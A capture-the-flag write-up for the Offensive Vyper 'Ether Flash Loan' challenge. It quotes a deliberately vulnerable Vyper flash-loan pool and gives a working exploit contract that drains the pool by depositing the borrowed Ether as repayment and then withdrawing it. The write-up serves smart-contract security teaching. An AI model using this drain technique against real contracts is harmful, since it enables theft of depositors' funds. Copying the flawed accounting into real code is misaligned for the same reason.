## 1) Challenge

> <cite>The Ether Flash Loan contract allows liquidity providers deposit Ether. The Ether in the pool can be lent out in a flash loan. The receiver of the flash loan must expose a payable `execute()` function. By the end of `execute()`, the flash loan must be payed back. There is no fee. Your objective is to drain the flash loan pool, despite those pesky reentrancy guards.</cite>

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

`EtherFlashLoan.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/ether-flash-loan/EtherFlashLoan.vy)):

```python

# @version ^0.3.2

"""
@title Ether Flash Loan Pool
@author jtriley.eth
"""

interface IFlashLoanReceiver:
    def execute(): payable

event Deposit:
    account: indexed(address)
    amount: uint256

event Withdrawal:
    account: indexed(address)
    amount: uint256


deposits: public(HashMap[address, uint256])


@external
@payable
@nonreentrant('deposit')
def deposit():
    """
    @notice Deposits Ether.
    """
    self.deposits[msg.sender] += msg.value
    log Deposit(msg.sender, msg.value)


@external
@nonreentrant('withdraw')
def withdraw(amount: uint256):
    """
    @notice Withdraws Ether.
    @param amount Withdrwawal amount.
    @dev Throws when amount is gt than deposit.
    """
    sender_deposit: uint256 = self.deposits[msg.sender]

    assert sender_deposit >= amount, "not enough deposited"

    self.deposits[msg.sender] = sender_deposit - amount

    raw_call(msg.sender, b"", value=amount)

    log Withdrawal(msg.sender, amount)


@external
@nonreentrant('flash_loan')
def flash_loan(amount: uint256):
    """
    @notice Flash Loans to caller.
    @param amount Amount to flash loan.
    @dev Throws when insufficient balance OR flash loan isn't paid back.
    """
    balance_before: uint256 = self.balance

    assert balance_before >= amount, "not enough balance"

    IFlashLoanReceiver(msg.sender).execute(value=amount)

    assert self.balance >= balance_before, "flash loan not paid back"


@external
@payable
def __default__():
    """
    @notice For paying back flash loans ONLY.
    """
    pass

```

Contract main functions:

- `deposit` updates the accounting variable `deposits` with the `msg.value` deposited by the `msg.sender` (line `30`). It's a payable function
- `withdraw` is responsible for withdrawing the amount requested:
    - it accepts as input the amount to withdraw
    - it retrieves the amount deposited for a given account (line `42`),
    - it checks if the amount requested is less than the one deposited (line `44`)
    - it updates the balance of `msg.sender` (line `46`)
    - finally, it sends this amount to `msg.sender` (line `48`)
- `flash_loan` holds the logic for providing loans:
    - it accepts as input the loan amount
    - it checks if the caller has enough balance (line `63`)
    - it calls the `execute`, exposed by the receiver contract (line `65`)
    - finally, it checks if the amount is paid it back (line `67`)

All these functions are decorated with `nonreentrant` meaning they're guarded against reentrancy attacks.

To withdraw, we need first to have some amount deposited. The amount deposited is stored in the `deposits` variable inside the `deposit` function.

So if we can deposit some ETH, we can later withdraw them. Of course, we can use the `flash_loan` function to request some ETH. Also, once we receive them, in the same transaction, we can `deposit` them. In this case, if we deposit the ETH borrowed, we both updates the `deposits` variable, but we also pay the loan back because the `deposit` function is a payable function. However, once we have paid back the loan, the `deposits` variable will still hold the amount we have deposited. So if we then call the `withdraw` function, the condition at line `44` will be true, and thus we will be able to steal all the account ETH. 


## 3) Solution

The solution consists of the following steps:
- call the `flash_loan` function asking for `2 ETH` (the contract balance)
- inside the `execute` function, call the `deposit` function and deposit `2 ETH`
- once the execution of the `flash_loan` is completed, we call the `withdraw` function in order to receive the ETH amount saved in `deposits`

`ether-flash-loan.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('EtherFlashLoanExploit', deployer)).deploy(this.etherFlashLoan.address)

        await exploit.connect(attacker).run();

    })

```

`EtherFlashLoanExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
def run():
    amount: uint256 = self.target.balance

    Etherflashloan(self.target).flash_loan(amount)

    Etherflashloan(self.target).withdraw(amount)


@external
@payable
def execute():
    """
    @notice This is the interface the Flash Loan Pool will try to call.
    Changing the external interface of this function will revert.
    """
    
    raw_call(
        self.target,
        _abi_encode("", method_id=method_id("deposit()")),
        value=msg.value
    )


@external
@payable
def __default__():
    pass
    
```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ether-flash-loan.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/EtherFlashLoanExploit.vy).


## 4) References

- [Re-entrancy Locks](https://vyper.readthedocs.io/en/v0.3.7/control-structures.html?highlight=nonreentrant#re-entrancy-locks)